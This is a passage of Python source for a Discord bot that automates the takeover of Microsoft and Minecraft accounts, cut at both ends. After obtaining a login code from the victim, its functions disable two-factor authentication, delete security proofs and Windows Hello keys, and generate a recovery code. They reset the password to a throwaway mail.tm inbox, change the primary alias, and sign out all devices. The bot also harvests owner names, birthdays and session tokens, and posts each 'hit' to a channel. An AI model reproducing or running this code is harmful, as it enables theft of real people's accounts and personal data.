        if "access_token" in jresponse:
            return jresponse["access_token"]
        return None

async def getCapes(ssid: str):
    async with httpx.AsyncClient(timeout=None) as session:
        response = await session.get(
            url="https://api.minecraftservices.com/minecraft/profile",
            headers={"Authorization": f"Bearer {ssid}"}
        )
        jresponse = response.json()
        if "capes" in jresponse:
            return jresponse["capes"]
        return None

async def getProfile(ssid: str):
    async with httpx.AsyncClient(timeout=None) as session:
        response = await session.get(
            url="https://api.minecraftservices.com/minecraft/profile",
            headers={"Authorization": f"Bearer {ssid}"}
        )
        jresponse = response.json()
        if "name" in jresponse:
            return jresponse["name"]
        return None

async def getMethod(ssid: str):
    async with httpx.AsyncClient(timeout=None) as session:
        licenses = await session.get(
            url="https://api.minecraftservices.com/entitlements/license?requestId=c24114ab-1814-4d5c-9b1f-e8825edaec1f",
            headers={"Authorization": f"Bearer {ssid}"}
        )
        licenses_json = licenses.json()
        if "items" in licenses_json:
            for item in licenses_json["items"]:
                if item["name"] in ["product_minecraft", "game_minecraft"]:
                    if item["source"] == "GAMEPASS":
                        return "Gamepass"
                    elif item["source"] in ["PURCHASE", "MC_PURCHASE"]:
                        return "Purchased"
        return None

async def getUsernameInfo(ssid: str):
    async with httpx.AsyncClient(timeout=None) as session:
        response = await session.get(
            url="https://api.minecraftservices.com/minecraft/profile/namechange",
            headers={"Authorization": f"Bearer {ssid}"}
        )
        response = response.json()
        if response["nameChangeAllowed"]:
            return True
        todayDate = datetime.datetime.now()
        if "changedAt" in response:
            changeDate = response["changedAt"]
        else:
            changeDate = response["createdAt"]
        finalDate = (parser.parse(changeDate) + datetime.timedelta(days=31)).replace(tzinfo=None)
        return (finalDate - todayDate).days

async def getCookies(session: httpx.AsyncClient):
    data = await session.get(
        url="https://account.live.com/password/reset",
        headers={"host": "account.live.com"},
        follow_redirects=False
    )
    apicanary = await decode(
        re.search(r'"apiCanary":"([^"]+)"', data.text).group(1)
    )
    amsc = data.cookies["amsc"]
    return apicanary

async def getT(session: httpx.AsyncClient):
    fetchT = await session.get(
        url="https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=21&ct=1708978285&rver=7.5.2156.0&wp=SA_20MIN&wreply=https://account.live.com/proofs/Add?apt=2&uaid=0637740e739c48f6bf118445d579a786&lc=1033&id=38936&mkt=en-US&uaid=0637740e739c48f6bf118445d579a786",
        follow_redirects=False
    )
    match = re.search(r'<input\s+type="hidden"\s+name="t"\s+id="t"\s+value="([^"]+)"\s*\/?>', fetchT.text)
    if match:
        return match.group(1)
    return None

async def getAMC(session: httpx.AsyncClient):
    redirect = await session.get("https://account.microsoft.com", follow_redirects=False)
    amcLink = redirect.headers["Location"]
    redirect2 = await session.get(url=amcLink)
    T = re.search(r'<input\s+type="hidden"\s+name="t"\s+id="t"\s+value="([^"]+)"\s*\/?>', redirect2.text).group(1)
    response = await session.post(
        url="https://account.microsoft.com/auth/complete-silent-signin?ru=https://account.microsoft.com/auth/complete-silent-signin?ru=https%3A%2F%2Faccount.microsoft.com%2F&wa=wsignin1.0&refd=login.live.com&wa=wsignin1.0",
        data=f"t={T}"
    )
    location1 = re.search(r'href="([^"]+)"', response.text).group(1)
    mainPage = await session.get(url=location1, follow_redirects=True)
    finalPage = await session.get(
        url="https://account.microsoft.com/",
        headers={
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Connection": "keep-alive",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0"
        }
    )
    rvt = re.search(r'name="__RequestVerificationToken"\s+type="hidden"\s+value="([^"]+)"', finalPage.text, re.DOTALL).group(1)
    return rvt

async def getOwnerInfo(session: httpx.AsyncClient, verificationToken: str):
    try:
        getInfo = await session.get(
            "https://account.microsoft.com/profile/api/v1/personal-info",
            headers={
                "Accept": "application/json, text/plain, */*",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "X-Requested-With": "XMLHttpRequest",
                "MS-CV": "LbJd6i44UUmIn7so.5.63",
                "__RequestVerificationToken": verificationToken,
                "Correlation-Context": "v=1,ms.b.tel.market=pt-PT,ms.b.qos.rootOperationName=GLOBAL.HOME.PROFILE.GETPERSONALINFO",
                "Connection": "keep-alive",
                "Referer": "https://account.microsoft.com/profile",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin"
            }
        )
        response = getInfo.json()
        return {
            "Fname": response["firstName"],
            "Lname": response["lastName"],
            "region": response["region"],
            "birthday": response["birthday"]
        }
    except Exception as e:
        print(f"Exception: {e}")
        return None

async def getAMRP(session: httpx.AsyncClient, T: str):
    fetchAMRP = await session.post(
        url="https://account.live.com/proofs/Add?apt=2&wa=wsignin1.0",
        data={"t": T},
        follow_redirects=False
    )
    if "AMRPSSecAuth" in fetchAMRP.cookies:
        return True
    return None

async def remove2FA(session: httpx.AsyncClient, apicanary: str):
    remove = await session.post(
        "https://account.live.com/API/Proofs/DisableTfa",
        headers={
            "host": "account.live.com",
            "Accept": "application/json",
            "Accept-Language": "en-US,en;q=0.5",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "x-ms-apiVersion": "2",
            "x-ms-apiTransport": "xhr",
            "uiflvr": "1001",
            "scid": "100109",
            "hpgid": "201030",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://account.live.com",
            "Referer": "https://account.live.com/proofs/Manage/additional",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "canary": apicanary
        },
        json={
            "uiflvr": 1001,
            "uaid": "abd2ca2a346c43c198c9ca7e4255f3bc",
            "scid": 100109,
            "hpgid": 201030
        },
        follow_redirects=False
    )
    if "apiCanary" in remove.json() and remove.status_code == 200:
        print("[+] - Disabled 2FA")
    else:
        print("[X] - Failed to disable 2FA")

async def removeZyger(session: httpx.AsyncClient, apicanary: str):
    remove = await session.post(
        url="https://account.live.com/API/Proofs/RevokeWindowsHelloProofs",
        headers={
            "host": "account.live.com",
            "Accept": "application/json",
            "Accept-Language": "en-US,en;q=0.5",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "x-ms-apiVersion": "2",
            "x-ms-apiTransport": "xhr",
            "uiflvr": "1001",
            "scid": "100109",
            "hpgid": "201030",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://account.live.com",
            "Referer": "https://account.live.com/proofs/Manage/additional",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "canary": apicanary
        },
        json={
            "uiflvr": 1001,
            "uaid": "abd2ca2a346c43c198c9ca7e4255f3bc",
            "scid": 100109,
            "hpgid": 201030
        },
        follow_redirects=False
    )
    if "apiCanary" in remove.json() and remove.status_code == 200:
        print("[+] - Removed Zyger")
    else:
        print("[X] - Failed to remove Zyger")

async def removeProof(session: httpx.AsyncClient, apicanary: str):
    proofs = await session.get(
        "https://account.live.com/proofs/manage/additional?mkt=en-US&refd=account.microsoft.com&refp=security",
        headers={
            "Accept-Language": "en-US,en;q=0.5",
            "Referer": "https://login.live.com/"
        },
        follow_redirects=False
    )
    proofIds = re.findall(r'"proofId":"([^"]+)"', proofs.text)
    decodedProofs = [codecs.decode(ID, "unicode_escape") for ID in proofIds]
    for proof in decodedProofs:
        await session.post(
            url="https://account.live.com/API/Proofs/DeleteProof",
            headers={
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
                "Accept": "application/json",
                "canary": apicanary
            },
            json={
                "proofId": proof,
                "uaid": "114b68368b7b46afa44c82a8246e4a44",
                "uiflvr": 1001,
                "scid": 100109,
                "hpgid": 201030
            }
        )
    print("[+] - Removed all Proofs")

async def removeServices(session: httpx.AsyncClient):
    uatRequest = await session.get(
        url="https://account.live.com/consent/Manage?guat=1",
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": "https://login.live.com/"
        }
    )
    client_ids = re.findall(r'client_id=([A-F0-9]{16})', uatRequest.text)
    if not client_ids:
        print("[+] - No Services Found")
        return
    print("[~] - Removing Services")
    for ID in client_ids:
        response = await session.get(
            url=f"https://account.live.com/consent/Edit?client_id={ID}",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            follow_redirects=False
        )
        postURL = re.search(r'name="editConsentForm"[^>]*action="([^"]+)"', response.text).group(1)
        canary = quote(re.search(r'canary"[^>]*value="([^"]+)"', response.text).group(1), safe="")
        await session.post(
            url=postURL,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data=f"canary={canary}",
            follow_redirects=False
        )
        print(f"[~] - Removed {ID}")

async def securityInformation(session: httpx.AsyncClient):
    secInfo = await session.get(url="https://account.live.com/proofs/Manage/additional")
    match = re.search(r'var\s+t0\s*=\s*(\{.*?\});', secInfo.text, re.DOTALL)
    return match.group(1)

async def getRecoveryCode(session: httpx.AsyncClient, apicanary: str, eni: str):
    data = await session.post(
        url="https://account.live.com/API/Proofs/GenerateRecoveryCode",
        headers={
            "host": "account.live.com",
            "Accept": "application/json",
            "Accept-Language": "en-US,en;q=0.5",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "x-ms-apiVersion": "2",
            "x-ms-apiTransport": "xhr",
            "uiflvr": "1001",
            "scid": "100109",
            "hpgid": "201030",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://account.live.com",
            "Referer": "https://account.live.com/proofs/Manage/additional",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "canary": apicanary
        },
        json={
            "encryptedNetId": eni,
            "uiflvr": 1001,
            "scid": 100109,
            "hpgid": 201030
        }
    )
    return data.json()["recoveryCode"]

async def generateEmail(email: str, password: str) -> list:
    async with httpx.AsyncClient(timeout=None) as session:
        getDomain = await session.get(url="https://api.mail.tm/domains", params={"page": 1})
        domain = getDomain.json()["hydra:member"][0]["domain"]
        finalEmail = f"{email}@{domain}"
        await session.post(
            url="https://api.mail.tm/accounts",
            headers={
                "Accept": "application/json",
                "Content-Type": "application/json"
            },
            json={
                "address": finalEmail,
                "password": password
            }
        )
        token = await session.post(
            url="https://api.mail.tm/token",
            headers={
                "Accept": "application/json",
                "Content-Type": "application/json"
            },
            json={
                "address": finalEmail,
                "password": password
            }
        )
        return [token.json()["token"], finalEmail]

async def getEmailCode(token: str) -> str:
    async with httpx.AsyncClient(timeout=None) as session:
        while True:
            checkEmails = await session.get(
                url="https://api.mail.tm/messages",
                headers={
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "authorization": f"Bearer {token}"
                }
            )
            rJson = checkEmails.json()
            if rJson:
                ID = rJson[0]["id"]
                getEmail = await session.get(
                    url=f"https://api.mail.tm/messages/{ID}",
                    headers={
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "authorization": f"Bearer {token}"
                    }
                )
                emailText = getEmail.json()["text"]
                code = re.search(r'Security code:\s*(\d+)', emailText).group(1)
                return code
            await asyncio.sleep(0.8)

async def recover(email: str, recoveryCode: str, new_email: str, new_password: str, email_token: str):
    async with httpx.AsyncClient(timeout=None) as session:
        data = await session.get(url=f"https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/oauth20_authorize.srf&mn={email}")
        amsc = data.cookies["amsc"]
        serverData = json.loads(re.search(r"var\s+ServerData=(.*?)(?=;|$)", data.text).group(1))
        decoded_token = codecs.decode(unquote(serverData["sRecoveryToken"]), "unicode_escape")
        recToken = await session.post(
            url="https://account.live.com/API/Recovery/VerifyRecoveryCode",
            headers={
                "Content-type": "application/json; charset=utf-8",
                "Accept-encoding": "gzip, deflate, br, zstd",
                "Accept": "application/json",
                "Connection": "keep-alive",
                "Cookie": f"amsc={amsc}",
                "canary": serverData["apiCanary"],
                "hpgid": "200284",
                "hpgact": "0"
            },
            json={
                "recoveryCode": recoveryCode,
                "code": recoveryCode,
                "scid": 100103,
                "token": decoded_token,
                "uiflvr": 1001
            }
        )
        recJson = recToken.json()
        if recToken.status_code == 200:
            canary = recJson["apiCanary"]
            token = recJson["token"]
            sendCode = await session.post(
                url="https://account.live.com/api/Proofs/SendOtt",
                headers={
                    "Content-type": "application/json; charset=utf-8",
                    "Accept": "application/json",
                    "canary": canary,
                    "hpgid": "200284",
                    "hpgact": "0",
                    "Cookie": f"amsc={amsc}"
                },
                json={
                    "associationType": "None",
                    "action": "VerifyNewProof",
                    "channel": "Email",
                    "cxt": "MP",
                    "proofId": new_email,
                    "scid": 100103,
                    "token": token,
                    "uiflvr": 1001
                }
            )
            responseJson = sendCode.json()
            if "apiCanary" in responseJson:
                canary = responseJson["apiCanary"]
                code = await getEmailCode(email_token)
                verifyCodeResponse = await session.post(
                    url="https://account.live.com/API/Proofs/VerifyCode",
                    headers={
                        "Content-type": "application/json; charset=utf-8",
                        "Accept": "application/json",
                        "canary": canary,
                        "hpgid": "200284",
                        "hpgact": "0",
                        "Cookie": f"amsc={amsc}"
                    },
                    json={
                        "action": "VerifyOtc",
                        "proofId": new_email,
                        "scid": 100103,
                        "token": token,
                        "uiflvr": 1001,
                        "code": code
                    }
                )
                verifyCodeResponseJson = verifyCodeResponse.json()
                canary = verifyCodeResponseJson["apiCanary"]
                finishSecure = await session.post(
                    url="https://account.live.com/API/Recovery/RecoverUser",
                    headers={
                        "Content-type": "application/json; charset=utf-8",
                        "Accept": "application/json",
                        "canary": canary,
                        "hpgid": "200284",
                        "hpgact": "0",
                        "Cookie": f"amsc={amsc}"
                    },
                    json={
                        "contactEmail": new_email,
                        "contactEpid": "",
                        "password": new_password,
                        "passwordExpiryEnabled": 0,
                        "scid": 100103,
                        "token": token,
                        "uaid": "6b182876e51a429db0e2cff317076750",
                        "uiflvr": 1001
                    }
                )
                finishJson = finishSecure.json()
                if "recoveryCode" in finishJson:
                    return finishJson["recoveryCode"]
            return None

async def changePrimaryAlias(session: httpx.AsyncClient, emailName: str, apicanary: str) -> bool:
    try:
        getCanary = await session.get(url="https://account.live.com/AddAssocId", headers={"Content-Type": "application/x-www-form-urlencoded"})
        canary = quote(
            re.search(r'name="canary" value="([^"]+)"', getCanary.text).group(1),
            safe=""
        )
        await session.post(
            url="https://account.live.com/AddAssocId?ru=&cru=&fl=",
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://account.live.com",
                "Referer": "https://account.live.com/AddAssocId"
            },
            data=f"canary={canary}&PostOption=LIVE&SingleDomain=&UpSell=&AddAssocIdOptions=LIVE&AssociatedIdLive={emailName}&DomainList=outlook.com"
        )
        pinfo = await session.post(
            url="https://account.live.com/API/MakePrimary",
            headers={
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
                "Accept": "application/json",
                "hpgid": "200176",
                "scid": "100141",
                "uiflvr": "1001",
                "canary": apicanary
            },
            json={
                "aliasName": f"{emailName}@outlook.com",
                "emailChecked": True,
                "removeOldPrimary": True,
                "uiflvr": 1001,
                "scid": 100141,
                "hpgid": 200176
            }
        )
        if "error" in pinfo.json():
            print(f"[X] - Failed to change Primary Alias")
            return False
        return True
    except Exception:
        print(f"[X] - Failed to change Primary Alias")
        return False

async def logoutAll(session: httpx.AsyncClient, apicanary: str):
    remove = await session.post(
        "https://account.live.com/API/Proofs/DeleteDevices",
        headers={"canary": apicanary},
        json={
            "uiflvr": 1001,
            "uaid": "abd2ca2a346c43c198c9ca7e4255f3bc",
            "scid": 100109,
            "hpgid": 201030
        },
        follow_redirects=False
    )
    if "apiCanary" in remove.json() and remove.status_code == 200:
        print("[+] - Sucessfully Logout all devices")
    else:
        print("[X] - Failed to logout of all devices")

async def secure(session: httpx.AsyncClient):
    ralias = config["autosecure"]["replace_main_alias"]
    database = DBConnection()
    
    apicanary = await getCookies(session)
    
    accountInfo = {
        "oldName": "Failed to Get",
        "newName": "Couldn't Change!",
        "email": "Couldn't Change!",
        "secEmail": "Couldn't Change!",
        "password": "Couldn't Change!",
        "recoveryCode": "Couldn't Change!",
        "status": "Unknown",
        "SSID": False,
        "firstName": "Failed to Get",
        "lastName": "Failed to Get",
        "fullName": "Failed to Get",
        "region": "Failed to Get",
        "birthday": "Failed to Get",
        "method": "Not purchased",
        "capes": "No capes"
    }
    
    T = await getT(session)
    if not T:
        print("[X] - Failed to get T\n[~] - This account needs to accept TOS manually (for now...)")
        return accountInfo
    
    print("[+] - Found T")
    verificationToken = await getAMC(session)
    ownerInfo = await getOwnerInfo(session, verificationToken)
    if ownerInfo:
        print("[+] - Got Owner Info")
        accountInfo["firstName"] = ownerInfo["Fname"]
        accountInfo["lastName"] = ownerInfo["Lname"]
        accountInfo["region"] = ownerInfo["region"]
        accountInfo["birthday"] = ownerInfo["birthday"]
        accountInfo["fullName"] = f"{ownerInfo['Fname']} {ownerInfo['Lname']}"
    
    print("[~] - Checking Minecraft Account")
    XBLResponse = await getXBL(session)
    if XBLResponse:
        print("[+] - Got XBL (Has Xbox Profile)")
        xbl = XBLResponse["xbl"]
        ssid = await getSSID(xbl)
        if ssid:
            print("[+] - Got SSID! (Has Minecraft)")
            accountInfo["SSID"] = ssid
            capes = await getCapes(ssid)
            if capes:
                accountInfo["capes"] = ", ".join(i["alias"] for i in capes)
                print(f"[+] - Got capes")
            else:
                accountInfo["capes"] = "No Capes"
            profile = await getProfile(ssid)
            if not profile:
                print("[x] - Failed to get profile (No Minecraft Java)")
            else:
                print(f"[+] - Got profile (Has Minecraft Java)")
                accountInfo["oldName"] = profile
                usernameInfo = await getUsernameInfo(ssid)
                if type(usernameInfo) is bool:
                    accountInfo["usernameInfo"] = "Yes"
                else:
                    accountInfo["usernameInfo"] = f"Changeable in {usernameInfo} days"
            method = await getMethod(ssid)
            if method:
                accountInfo["method"] = method
                print(f"[+] - Got purchase method")
        else:
            print("[x] - Failed to get SSID")
    else:
        print("[x] - Failed to get XBL (Account has no Xbox Profile)")
        accountInfo["oldName"] = "No Minecraft"

    await getAMRP(session, T)
    print("[+] - Got AMRP")
    await remove2FA(session, apicanary)
    await removeZyger(session, apicanary)
    await removeProof(session, apicanary)
    await removeServices(session)
    
    securityParameters = json.loads(await securityInformation(session))
    print("[+] - Got Security Parameters")
    
    if securityParameters:
        mainEmail = securityParameters["email"]
        encryptedNetID = securityParameters["WLXAccount"]["manageProofs"]["encryptedNetId"]
        recoveryCode = await getRecoveryCode(session, apicanary, encryptedNetID)
        print(f"[+] - Got Recovery Code | {recoveryCode}")
        secEmail = uuid.uuid4().hex[:16]
        newPassword = uuid.uuid4().hex[:12]
        emailToken, secEmail = await generateEmail(secEmail, newPassword)
        print(f"[+] - Generated Security Email ({secEmail})")
        database.addEmail(secEmail, newPassword)
        print("[~] - Automaticly Securing Account...")
        newData = await recover(mainEmail, recoveryCode, secEmail, newPassword, emailToken)
        if newData:
            accountInfo["secEmail"] = secEmail
            accountInfo["recoveryCode"] = newData
            accountInfo["password"] = newPassword
        else:
            print(f"[X] - Failed to secure this account")
        
        if ralias:
            primaryEmail = f"auto{uuid.uuid4().hex[:12]}"
            print(f"[+] - Generated Primary Email ({primaryEmail}@outlook.com)")
            info = await changePrimaryAlias(session, primaryEmail, apicanary)
            if info:
                accountInfo["email"] = f"{primaryEmail}@outlook.com"
                print(f"[+] - Changed Primary Alias")
            else:
                accountInfo["email"] = mainEmail
        else:
            accountInfo["email"] = mainEmail
    
    await logoutAll(session, apicanary)
    print("[+] - Account has been secured")
    return accountInfo

async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: str = None, code: str = None):
    """Logs the account in and runs the securing process on it."""
    data = await getLiveData(session)
    msaauth = await getMSAAUTH(session, email, device, data, code)
    if not msaauth:
        print("[-] - Failed to get MSAAUTH | Invalid OTP Code")
        return None
    print("[+] - Got Cookies! Polishing login cookie...")
    host = await polishHost(session, msaauth)
    print(f"MSAAUTH: {host}")
    print("[+] - Got MSAAUTH | Starting to secure...")
    initialTime = time.time()
    account = await secure(session)
    finalTime = (time.time() - initialTime)
    return account, finalTime

async def announceHit(account: dict, elapsed: float, requester: discord.abc.User):
    """Stores the hit and posts the secured account panel to the hits channel."""
    hits_channel = await bot.fetch_channel(config["discord"]["accounts_channel"])
    hit = uuid.uuid4().hex[:10]
    with DBConnection() as database:
        database.addHit(hit, requester.id, json.dumps(account))
    await hits_channel.send("@everyone **Successfully secured an account**")
    await hits_channel.send(view=hitPanel(account, elapsed, hit, requester))

async def secureAndAnnounce(
    interaction: discord.Interaction,
    session: httpx.AsyncClient,
    email: str,
    device: str = None,
    code: str = None
):
    """Secures an account and reports the result to the hits channel."""
    result = await startSecuringAccount(session, email, device, code)
    if not result:
        await interaction.followup.send(
            view=notice("The account could not be secured, the code was most likely invalid."),
            ephemeral=True
        )
        return
    account, elapsed = result
    await announceHit(account, elapsed, interaction.user)

async def totp(secret: str) -> str | None:
    try:
        secret = secret.upper().replace(" ", "").replace("\n", "").replace("\r", "")
        padding = (8 - len(secret) % 8) % 8
        secret_padded = secret + "=" * padding
        k = base64.b32decode(secret_padded)
        c = int(time.time()) // 30
        h = hmac.new(k, struct.pack(">Q", c), hashlib.sha1).digest()
        o = h[-1] & 15
        code = struct.unpack(">I", h[o:o+4])[0] & 0x7fffffff
        return f"{code % 1000000:06d}"
    except Exception:
        return None

async def fetchInbox(token: str) -> list | None:
    async with httpx.AsyncClient(timeout=None) as session:
        getEmails = await session.get(
            url="https://api.mail.tm/messages",
            headers={
                "Accept": "application/json",
                "Content-Type": "application/json",
                "authorization": f"Bearer {token}"
            }
        )
        emails = getEmails.json()
        emailsText = []
        if emails:
            for email in getEmails.json():
                response = await session.get(
                    url=f"https://api.mail.tm/messages/{email['id']}",
                    headers={
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "authorization": f"Bearer {token}"
                    }
                )
                emailData = response.json()
                emailsText.append(emailData["text"])
            return emailsText
        return None

# ==================== BOT CLASS ====================
class DiscordBot(commands.Bot):
    def __init__(self):
        super().__init__(
            command_prefix="!",
            case_insensitive=True,
            intents=discord.Intents.all(),
            allowed_mentions=discord.AllowedMentions(roles=False, everyone=False, users=True)
        )
        self.logger = logging.getLogger("bot")
        self.admins = config["owners"]

    async def setup_hook(self) -> None:
        # Register commands directly
        self.tree.add_command(accounts_command)
        self.tree.add_command(reload_command)
        self.tree.add_command(auth_code_command)
        self.tree.add_command(check_locked_command)
        self.tree.add_command(requestotp_command)
        self.tree.add_command(secure_command)
        self.tree.add_command(inbox_command)
        self.tree.add_command(list_mails_command)
        self.tree.add_command(send_embed_command)
        self.tree.add_command(set_channel_command)

        # Load jishaku (optional hot-reload extension)
        try:
            await self.load_extension("jishaku")
        except errors.ExtensionNotFound:
            logging.warning("jishaku is not installed; hot-reload commands are unavailable.")

        # Create database tables if they don't exist
        with DBConnection() as database:
            database.cursor.execute("""
                CREATE TABLE IF NOT EXISTS `security_emails` (
                    email TEXT,
                    password TEXT
                )
            """)
            database.cursor.execute("""
                CREATE TABLE IF NOT EXISTS `secured_accounts` (
                    hit TEXT,
                    user INTEGER,
                    payload TEXT
                )
            """)
            database.conn.commit()

        # Sync commands globally once
        try:
            synced = await self.tree.sync()
            self.logger.info(f"Synced {len(synced)} application commands (global).")
        except Exception as e:
            self.logger.exception(f"Failed to sync application commands: {e}")

    async def on_ready(self):
        # Only run once
        if getattr(self, "_startup_done", False):
            return
        self._startup_done = True

        # Re-register the persistent verification panel and every dynamic item
        # class that is used inside of it
        self.add_view(verificationPanel())
        # The buttons of hit panels live in the channel, register their class so
        # they keep working after a restart
        self._connection.store_dynamic_items(HitButton)

        self.logger.info(f"Bot is ready as {self.user} (ID: {self.user.id})")
        self.logger.info(f"Connected to {len(self.guilds)} guilds")

    @staticmethod
    def setup_logging() -> None:
        logging.getLogger("discord").setLevel(logging.INFO)
        logging.getLogger("discord.http").setLevel(logging.WARNING)
        logging.getLogger("httpx").setLevel(logging.DEBUG)
        
        logging.basicConfig(
            level=logging.INFO,
            format="%(levelname)s | %(asctime)s | %(name)s | %(message)s",
            stream=sys.stdout,
        )

# ==================== COMMANDS ====================
def isAdmin(interaction: discord.Interaction) -> bool:
    """Whether the user behind an interaction owns the bot."""
    return interaction.user.id in interaction.client.admins

async def noPermission(interaction: discord.Interaction) -> None:
    """The panel that is shown to everyone that is not an owner."""
    await interaction.response.send_message(
        view=notice("You do not have permission to execute this command!"),
        ephemeral=True
    )

@app_commands.command(name="accounts", description="Shows you all stored accounts")
async def accounts_command(interaction: discord.Interaction):
    if not isAdmin(interaction):
        await noPermission(interaction)
        return
    await interaction.response.send_message(
        view=notice("This command is still in progress.", "In Progress", accent=WARNING),
        ephemeral=True
    )

@app_commands.command(name="reload")
async def reload_command(interaction: discord.Interaction, cog: str):
    if not isAdmin(interaction):
        await noPermission(interaction)
        return
    try:
        await interaction.client.reload_extension(cog)
    except commands.ExtensionError as error:
        await interaction.response.send_message(
            view=notice(f"Failed to reload `{cog}`: {error}"),
            ephemeral=True
        )
        return
    await interaction.response.send_message(
        view=notice(f"`{cog}`", "Reloaded Cogs", accent=SUCCESS)
    )

@reload_command.autocomplete(name="cog")
async def autocomplete_callback(interaction: discord.Interaction, current: str):
    options = [cog for cog in interaction.client.extensions.keys()]
    return [
        app_commands.Choice(name=option, value=option)
        for option in options
        if current.lower() in option.lower()
    ]

@app_commands.command(name="auth_code", description="Generates an OTP with a 2FA Secret")
async def auth_code_command(interaction: discord.Interaction, secret: str):
    if not isAdmin(interaction):
        await noPermission(interaction)
        return

    code = await totp(secret.strip())
    if not code:
        await interaction.response.send_message(
            view=notice("This secret is invalid."),
            ephemeral=True
        )
        return

    await interaction.response.send_message(
        view=screen(TotpPanel(secret.strip(), code)),
        ephemeral=True
    )

@app_commands.command(name="check_locked", description="Checks if an account is locked")
async def check_locked_command(interaction: discord.Interaction, email: str):
    if not isAdmin(interaction):
        await noPermission(interaction)
        return

    await interaction.response.defer(ephemeral=True)
    lockedInfo = await checkLocked(email)
    if lockedInfo and lockedInfo["StatusCode"] != 500:
        if "Value" not in lockedInfo or json.loads(lockedInfo["Value"])["status"]["isAccountSuspended"]:
            await interaction.followup.send(
                view=notice(f"This email (`{email}`) is **locked**", "Locked"),
                ephemeral=True
            )
            return
        await interaction.followup.send(
            view=notice(f"This email (`{email}`) is **not** locked", "Not Locked", accent=SUCCESS),
            ephemeral=True
        )
        return

    await interaction.followup.send(
        view=notice("Failed to check if this email is locked", accent=WARNING),
        ephemeral=True
    )

@app_commands.command(name="requestotp", description="Email OTP (2FA Bypass)")
async def requestotp_command(interaction: discord.Interaction, email: str):
    if not isAdmin(interaction):
        await noPermission(interaction)
        return

    await interaction.response.defer(ephemeral=True)
    session = getSession()
    response = await sendAuth(session, email)
    if "OtcLoginEligibleProofs" in response["Credentials"]:
        for value in response["Credentials"]["OtcLoginEligibleProofs"]:
            if value["otcSent"]:
                await interaction.followup.send(
                    view=notice(f"Sucessfully sent OTP to `{value['display']}`", "Sent", accent=SUCCESS),
                    ephemeral=True
                )
                return

    await interaction.followup.send(
        view=notice("Sucessfully sent OTP", "Sent", accent=SUCCESS),
        ephemeral=True
    )

@app_commands.command(name="secure", description="Automaticly secures your account")
async def secure_command(interaction: discord.Interaction):
    if not isAdmin(interaction):
        await noPermission(interaction)
        return

    await interaction.response.send_message(
        view=screen(SecuringMethodPanel()),
        ephemeral=True
    )

@app_commands.command(name="inbox", description="Shows the inbox of your email")
async def inbox_command(interaction: discord.Interaction, email: str):
    if not isAdmin(interaction):
        await noPermission(interaction)
        return

    await interaction.response.defer(ephemeral=True)
    with DBConnection() as db:
        password = db.getEmailPassword(email)
        if not password:
            await interaction.followup.send(
                view=notice("This email has not been found", "Unknown Email"),
                ephemeral=True
            )
            return

    async with httpx.AsyncClient(timeout=None) as session:
        data = await session.post(
            url="https://api.mail.tm/token",
            headers={
                "Accept": "application/json",
                "Content-Type": "application/json"
            },
            json={
                "address": email,
                "password": password[0]
            }
        )
        token = data.json()["token"]

    emails = await fetchInbox(token)
    if not emails:
        await interaction.followup.send(
            view=notice("You don't have any emails stored", "No Emails Found", accent=WARNING),
            ephemeral=True
        )
        return

    await interaction.followup.send(
        view=screen(InboxPanel(emails)),
        ephemeral=True
    )

@app_commands.command(name="list_mails", description="Lists all security emails")
async def list_mails_command(interaction: discord.Interaction):
    if not isAdmin(interaction):
        await noPermission(interaction)
        return

    with DBConnection() as database:
        emails = list(database.getEmails())
    if not emails:
        await interaction.response.send_message(
            view=notice("You don't have any emails stored", "No Emails Found", accent=WARNING),
            ephemeral=True
        )
        return

    listed = "\n".join(f"- `{email[0]}`" for email in emails)
    if len(listed) > 3500:
        listed = listed[:3500] + "\n- …"

    await interaction.response.send_message(
        view=screen(
            card(
                heading(f"Security Emails ({len(emails)})"),
                text(listed),
                divider(discord.SeparatorSpacing.large),
                text("*These emails are automaticly deleted after 7 days*")
            )
        ),
        ephemeral=True
    )

@app_commands.command(name="send_embed", description="Sends the verification panel")
@app_commands.choices(
    panel=[
        app_commands.Choice(name="Default", value="default"),
        app_commands.Choice(name="Custom", value="custom")
    ]
)
async def send_embed_command(interaction: discord.Interaction, panel: app_commands.Choice[str]):
    if not isAdmin(interaction):
        await noPermission(interaction)
        return

    if not config["discord"]["accounts_channel"]:
        await interaction.response.send_message(
            view=notice("You must set the Accounts channel first with /set_channel!"),
            ephemeral=True
        )
        return

    match panel.value:
        case "default":
            await interaction.response.defer(ephemeral=True)
            await interaction.channel.send(view=verificationPanel())
            await interaction.followup.send(
                view=notice("Sent!", "Done", accent=SUCCESS),
                ephemeral=True
            )
        case "custom":
            await interaction.response.send_modal(PanelModal())

@app_commands.command(name="set_channel", description="Sets your channel ID")
@app_commands.choices(
